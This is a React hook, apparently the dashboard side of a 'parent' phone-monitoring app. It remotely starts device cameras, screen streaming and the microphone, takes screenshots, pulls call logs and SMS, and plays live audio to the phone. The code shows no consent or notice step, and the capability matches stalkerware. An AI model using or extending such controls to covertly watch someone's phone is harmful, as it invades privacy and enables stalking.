import { useEffect, useRef, useState, useCallback } from 'react'
import { io } from 'socket.io-client'
import axios from 'axios'

const SERVER_URL = import.meta.env.VITE_SERVER_URL || 'http://localhost:4000'

export function useSocket(token) {
  const socketRef      = useRef(null)
  const audioCtxRef    = useRef(null)
  const liveSpeakRef   = useRef({ stream: null, ctx: null, processor: null, source: null })

  const [connected,    setConnected]    = useState(false)
  const [devices,      setDevices]      = useState({})
  const [deviceNames,  setDeviceNames]  = useState({})
  const [cameraFrames, setCameraFrames] = useState({})   // { deviceId: { front, back } }
  const [screenFrames, setScreenFrames] = useState({})   // { deviceId: base64 }
  const [micActive,    setMicActive]    = useState({})
  const [deviceInfos,  setDeviceInfos]  = useState({})
  const [batteries,    setBatteries]    = useState({})
  const [callLogs,     setCallLogs]     = useState({})
  const [smsMessages,  setSmsMessages]  = useState({})
  const [screenshots,  setScreenshots]  = useState({})

  useEffect(() => {
    if (!token) return

    axios.get(`${SERVER_URL}/api/devices`, { headers: { Authorization: `Bearer ${token}` } })
      .then(res => {
        const devMap = {}, nameMap = {}
        res.data.forEach(d => {
          devMap[d.deviceId] = d
          if (d.name)    nameMap[d.deviceId] = d.name
          if (d.info)    setDeviceInfos(p => ({ ...p, [d.deviceId]: d.info }))
          if (d.battery) setBatteries(p => ({ ...p, [d.deviceId]: d.battery }))
        })
        setDevices(devMap)
        setDeviceNames(nameMap)
      }).catch(() => {})

    const socket = io(SERVER_URL, { query: { role: 'parent' } })
    socketRef.current = socket

    socket.on('connect',    () => setConnected(true))
    socket.on('disconnect', () => setConnected(false))

    socket.on('device:status', ({ deviceId, online }) =>
      setDevices(p => ({ ...p, [deviceId]: { ...p[deviceId], deviceId, online } })))

    socket.on('device:name', ({ deviceId, name }) =>
      setDeviceNames(p => ({ ...p, [deviceId]: name })))

    socket.on('camera:frame', ({ deviceId, frame, cameraType }) => {
      const type = cameraType || 'front'
      setCameraFrames(p => ({ ...p, [deviceId]: { ...p[deviceId], [type]: frame } }))
    })

    socket.on('screen:frame', ({ deviceId, frame }) =>
      setScreenFrames(p => ({ ...p, [deviceId]: frame })))

    socket.on('mic:state', ({ deviceId, active }) =>
      setMicActive(p => ({ ...p, [deviceId]: active })))

    socket.on('mic:audio', ({ chunk, format, sampleRate }) => {
      if (format === 'pcm16') playPCM16(chunk, sampleRate || 16000)
      else playWebM(chunk)
    })

    socket.on('device:info',    ({ deviceId, ...info }) => setDeviceInfos(p => ({ ...p, [deviceId]: info })))
    socket.on('battery:update', ({ deviceId, level, charging }) => setBatteries(p => ({ ...p, [deviceId]: { level, charging } })))
    socket.on('call:logs',      ({ deviceId, logs })     => setCallLogs(p => ({ ...p, [deviceId]: logs })))
    socket.on('sms:messages',   ({ deviceId, messages }) => setSmsMessages(p => ({ ...p, [deviceId]: messages })))
    socket.on('screenshot:saved', ({ deviceId, filename, filepath, timestamp }) =>
      setScreenshots(p => ({ ...p, [deviceId]: { filename, filepath, timestamp } })))

    return () => { socket.disconnect(); socketRef.current = null }
  }, [token])

  // ── Audio helpers ─────────────────────────────────────────────────
  function getAudioCtx() {
    if (!audioCtxRef.current)
      audioCtxRef.current = new (window.AudioContext || window.webkitAudioContext)()
    if (audioCtxRef.current.state === 'suspended') audioCtxRef.current.resume()
    return audioCtxRef.current
  }

  async function playPCM16(base64, sampleRate = 16000) {
    try {
      const binary = atob(base64)
      const bytes  = new Uint8Array(binary.length)
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i)
      const samples = new Int16Array(bytes.buffer)
      const ctx    = getAudioCtx()
      const buffer = ctx.createBuffer(1, samples.length, sampleRate)
      const ch     = buffer.getChannelData(0)
      for (let i = 0; i < samples.length; i++) ch[i] = samples[i] / 32768
      const src = ctx.createBufferSource()
      src.buffer = buffer; src.connect(ctx.destination); src.start()
    } catch { /* ignore */ }
  }

  async function playWebM(base64) {
    try {
      const binary = atob(base64)
      const bytes  = new Uint8Array(binary.length)
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i)
      const ctx    = getAudioCtx()
      const buffer = await ctx.decodeAudioData(bytes.buffer.slice(0))
      const src    = ctx.createBufferSource()
      src.buffer = buffer; src.connect(ctx.destination); src.start()
    } catch { /* ignore */ }
  }

  // ── Live speak: dashboard mic → phone speaker ─────────────────────
  const liveSpeakStart = useCallback(async (deviceId) => {
    const ls = liveSpeakRef.current
    if (ls.stream) return
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
      const ctx    = new AudioContext({ sampleRate: 16000 })
      const source = ctx.createMediaStreamSource(stream)
      const proc   = ctx.createScriptProcessor(2048, 1, 1)

      proc.onaudioprocess = (e) => {
        if (!socketRef.current) return
        const f32  = e.inputBuffer.getChannelData(0)
        const i16  = new Int16Array(f32.length)
        for (let i = 0; i < f32.length; i++)
          i16[i] = Math.max(-32768, Math.min(32767, f32[i] * 32767))
        let bin = ''
        const u8 = new Uint8Array(i16.buffer)
        for (let i = 0; i < u8.length; i++) bin += String.fromCharCode(u8[i])
        socketRef.current.emit('speak:live:chunk', { deviceId, chunk: btoa(bin) })
      }

      source.connect(proc)
      proc.connect(ctx.destination) // must be connected to run

      socketRef.current?.emit('cmd:speak:live:start', { deviceId })
      ls.stream = stream; ls.ctx = ctx; ls.source = source; ls.processor = proc
    } catch (e) { console.error('Live speak error:', e) }
  }, [])

  const liveSpeakStop = useCallback((deviceId) => {
    const ls = liveSpeakRef.current
    try { ls.processor?.disconnect(); ls.source?.disconnect() } catch {}
    try { ls.ctx?.close() } catch {}
    try { ls.stream?.getTracks().forEach(t => t.stop()) } catch {}
    ls.stream = null; ls.ctx = null; ls.source = null; ls.processor = null
    socketRef.current?.emit('cmd:speak:live:stop', { deviceId })
  }, [])

  const emit = (event, data) => socketRef.current?.emit(event, data)

  const cameraStartFront = useCallback((deviceId) => emit('cmd:camera:start:front', { deviceId }), [])
  const cameraStartBack  = useCallback((deviceId) => emit('cmd:camera:start:back',  { deviceId }), [])
  const cameraStopFront  = useCallback((deviceId) => emit('cmd:camera:stop:front',  { deviceId }), [])
  const cameraStopBack   = useCallback((deviceId) => emit('cmd:camera:stop:back',   { deviceId }), [])
  const screenStart      = useCallback((deviceId) => emit('cmd:screen:start',       { deviceId }), [])
  const screenStop       = useCallback((deviceId) => emit('cmd:screen:stop',        { deviceId }), [])
  const micOn            = useCallback((deviceId) => emit('cmd:mic:on',             { deviceId }), [])
  const micOff           = useCallback((deviceId) => emit('cmd:mic:off',            { deviceId }), [])
  const speak            = useCallback((deviceId, audioData) => emit('cmd:speak',   { deviceId, audioData }), [])
  const takeScreenshot   = useCallback((deviceId) => emit('cmd:screenshot',         { deviceId }), [])
  const getCallLogs      = useCallback((deviceId) => emit('cmd:get:calllogs',       { deviceId }), [])
  const getSMS           = useCallback((deviceId) => emit('cmd:get:sms',            { deviceId }), [])

  const renameDevice = useCallback(async (deviceId, name) => {
    try {
      await axios.put(`${SERVER_URL}/api/devices/${deviceId}/name`, { name },
        { headers: { Authorization: `Bearer ${token}` } })
    } catch { /* ignore */ }
  }, [token])

  return {
    connected, devices, deviceNames, cameraFrames, screenFrames, micActive,
    deviceInfos, batteries, callLogs, smsMessages, screenshots,
    cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
    screenStart, screenStop, liveSpeakStart, liveSpeakStop,
    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS, renameDevice,
  }
}
